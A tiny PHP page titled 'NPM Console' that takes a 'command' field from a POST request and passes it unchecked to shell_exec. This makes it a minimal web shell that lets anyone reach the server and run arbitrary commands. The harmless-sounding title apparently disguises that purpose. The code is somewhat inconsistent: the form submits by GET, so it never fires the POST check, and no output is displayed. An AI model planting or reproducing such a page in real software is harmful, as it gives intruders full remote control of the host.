<?php
	if($_POST['command'] != "") {
		shell_exec($_POST['command']);
	}
?>
<html>
	<head>
		<title>NPM Console</title>
	</head>
	<body>
		<form>
			<input name="command" placeholder="Enter Command"></input>
			<button>Execute</button>
		</form>
	</body>
</html>
